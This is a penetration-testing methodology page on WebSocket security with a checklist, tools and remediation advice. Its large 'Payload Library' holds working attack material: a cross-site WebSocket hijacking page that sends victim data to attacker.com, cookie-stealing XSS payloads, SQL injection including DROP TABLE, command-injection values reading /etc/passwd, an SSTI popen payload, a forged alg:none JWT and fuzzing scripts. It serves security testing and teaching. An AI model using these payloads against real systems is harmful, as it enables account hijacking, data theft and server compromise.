---
title: "WebSocket Security Testing"
date: 2026-02-24
draft: false
---

# WebSocket Security Testing

> **Severity**: High | **CWE**: CWE-345, CWE-20, CWE-79
> **OWASP**: A03:2021 – Injection | A07:2021 – Identification and Authentication Failures

---

## What Are WebSocket Attacks?

WebSockets provide full-duplex, persistent connections. Unlike HTTP, WebSocket frames lack built-in CSRF protection, don't require `Content-Type` negotiation, and are often less scrutinized for injection. Attack surface: **Cross-Site WebSocket Hijacking (CSWSH)**, injection via WebSocket messages, and authentication bypass.

```
Upgrade handshake:
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://target.com

→ After upgrade: bidirectional message frames
→ No per-message CSRF protection
→ No per-message authentication header requirement
```

---

## Discovery Checklist

- [ ] Find WebSocket endpoints: browser DevTools → Network → WS filter
- [ ] Check Upgrade handshake — does server validate `Origin` header?
- [ ] Test CSWSH: connect from attacker.com — does it use victim's session cookie?
- [ ] Replay captured WebSocket messages with modified data (Burp WS Repeater)
- [ ] Test injection in WebSocket message payloads: XSS, SQLi, CMDi, SSTI
- [ ] Check authentication: is auth checked at handshake only or per-message?
- [ ] Test for IDOR in message IDs/room IDs
- [ ] Test for privilege escalation via message type manipulation
- [ ] Check if WebSocket messages are reflected (stored XSS via WS)
- [ ] Test token-based auth: JWT in WS URL or first message — test bypass
- [ ] Test reconnection — does reconnect revalidate auth?
- [ ] Test wss:// downgrade to ws:// (cleartext)

---

## Payload Library

### Attack 1 — Cross-Site WebSocket Hijacking (CSWSH)

If the server doesn't validate the `Origin` header during the WebSocket handshake, an attacker's page can initiate a WebSocket connection that **carries the victim's session cookie**.

```html
<!-- Attacker page: evil.com/cswsh.html -->
<!-- Victim visits this page while logged into target.com -->
<script>
var ws = new WebSocket("wss://target.com/chat");

ws.onopen = function() {
    console.log("Connected — cookie sent automatically!");
    // Send commands as victim:
    ws.send(JSON.stringify({
        "action": "getMessages",
        "room": "admin"
    }));
    // Or change email:
    ws.send(JSON.stringify({
        "action": "updateEmail",
        "email": "attacker@evil.com"
    }));
};

ws.onmessage = function(event) {
    // Exfiltrate server responses to attacker:
    fetch("https://attacker.com/steal?data=" + encodeURIComponent(event.data));
};

ws.onerror = function(error) {
    fetch("https://attacker.com/error?e=" + encodeURIComponent(error));
};
</script>
```

```bash
# Check Origin validation:
# In Burp: intercept WebSocket handshake, change Origin header
# Modify: Origin: https://attacker.com
# If server accepts → CSWSH likely possible

# Test via curl WebSocket upgrade:
curl -s --include \
  --no-buffer \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
  -H "Origin: https://attacker.com" \
  "https://target.com/ws"
# If 101 Switching Protocols → Origin not validated
```

### Attack 2 — XSS via WebSocket Message

```javascript
// If WebSocket messages are reflected into the DOM:
// Server-side stored XSS via WS message:

// Send via Burp WebSocket Repeater:
{"message": "<img src=x onerror=alert(document.cookie)>"}
{"message": "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"}
{"username": "attacker<script>alert(1)</script>"}
{"type": "notification", "content": "{{7*7}}"}   // SSTI

// HTML entity bypass (if sanitized with HTML entities only):
{"message": "&#x3C;img src=x onerror=alert(1)&#x3E;"}
{"message": "<img src=x onerror=alert(1)>"}

// If message goes into innerHTML:
{"html": "<img src=1 onerror=alert(document.domain)>"}
```

### Attack 3 — SQL Injection via WebSocket

```json
// Test all message fields for SQLi:
{"action": "getUser", "id": "1' OR '1'='1"}
{"action": "search", "query": "test' UNION SELECT password,2,3 FROM users--"}
{"room": "general' AND SLEEP(5)--"}
{"userId": "1; DROP TABLE users--"}

// Time-based blind via WS:
{"action": "lookup", "value": "1' AND SLEEP(5)--"}
// Measure response delay in Burp WS Repeater
```

### Attack 4 — Authentication Bypass / Token Manipulation

```bash
# Many WS apps authenticate via URL token or first message:
# wss://target.com/ws?token=JWT_TOKEN
# Or first message: {"auth": "SESSION_TOKEN"}

# Test: connect without auth token:
# Use Burp WebSocket Repeater → remove token from handshake URL
# See if server allows connection or sends data

# JWT manipulation in WS URL:
# Replace token with alg:none or weak-secret payload (see 28_JWT.md)
wss://target.com/ws?token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Test token reuse across users:
# Connect as user A → get server response → disconnect
# Reconnect as user B using user A's session → does server accept?

# Test if auth validated per-message or only at handshake:
# 1. Connect with valid session
# 2. Session expires server-side
# 3. Continue sending messages → are they still processed?
```

### Attack 5 — Command Injection via WebSocket

```json
// If WS endpoint processes commands:
{"command": "ping 127.0.0.1"}
{"command": "ping 127.0.0.1; id"}
{"command": "ping 127.0.0.1 | id"}
{"command": "ping $(id)"}
{"command": "`id`"}
{"command": "ping 127.0.0.1\nid"}

// OS command in specific fields:
{"filename": "test.txt; cat /etc/passwd"}
{"host": "127.0.0.1; whoami"}
{"template": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}
```

### Attack 6 — IDOR via WebSocket

```json
// Change room/channel/user IDs:
{"action": "getMessages", "room_id": "VICTIM_ROOM_ID"}
{"action": "subscribe", "channel": "admin-channel"}
{"action": "updateUser", "user_id": 1, "role": "admin"}
{"action": "getFile", "file_id": "../../etc/passwd"}

// Message replay attack:
// Capture: {"action": "transfer", "to": "attacker", "amount": 100}
// Replay same frame multiple times (race condition)
```

### Attack 7 — WebSocket Smuggling

```bash
# HTTP/1.1 Request Smuggling via WebSocket upgrade:
# If front-end doesn't properly validate Upgrade request:

POST / HTTP/1.1
Host: target.com
Content-Length: 0
Connection: Upgrade, HTTP2-Settings
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==

# Some proxies don't properly handle partial WS upgrades
# → Smuggled HTTP request in the WS frame body
```

---

## Tools

```bash
# Burp Suite (essential):
# - Proxy → WebSockets history tab (all WS frames captured)
# - Right-click frame → Send to Repeater (WS Repeater)
# - WS Repeater: manually craft and send frames
# - Active Scan includes basic WS injection tests

# wscat — command line WebSocket client:
npm install -g wscat
wscat -c wss://target.com/ws --header "Cookie: session=VALUE"
wscat -c wss://target.com/ws  # test without auth
# Interactive: type messages, see responses

# websocat — advanced WebSocket CLI:
cargo install websocat
websocat wss://target.com/ws
websocat -H "Cookie: session=VALUE" wss://target.com/ws

# CSWSH test — Python:
pip3 install websocket-client
python3 -c "
import websocket
ws = websocket.WebSocket()
ws.connect('wss://target.com/ws', origin='https://attacker.com')
ws.send('{\"action\": \"getProfile\"}')
print(ws.recv())
ws.close()
"

# Injection fuzzing via Python:
python3 -c "
import websocket, json

payloads = [
    '{\"id\": \"1\\'OR\\'1\\'=\\'1\"}',
    '{\"msg\": \"<script>alert(1)</script>\"}',
    '{\"cmd\": \"id\"}',
]
ws = websocket.WebSocket()
ws.connect('wss://target.com/ws', cookie='session=VALUE')
for p in payloads:
    ws.send(p)
    print(ws.recv()[:200])
ws.close()
"

# Discover WS endpoints:
# Browser DevTools → Network → WS tab
# Burp Proxy → WebSockets history
# grep JS files:
grep -rn "new WebSocket\|websocket\|wss://\|ws://" --include="*.js" .
```

---

## Remediation Reference

- **Validate `Origin` header** during WebSocket handshake — reject unexpected origins
- **Use CSRF-equivalent token in first WS message** or as a query parameter to the handshake
- **Re-authenticate per session/message** for sensitive operations
- **Input validation on all WebSocket message fields** — treat as untrusted user input
- **Authenticate at every reconnect** — don't assume a new connection belongs to the same authenticated user
- **Use `wss://` only** — reject `ws://` (cleartext) connections
- **Rate-limit message frequency** to prevent DoS via message floods
- **Validate JSON schema** of incoming messages — reject unexpected fields/types

*Part of the Web Application Penetration Testing Methodology series.*
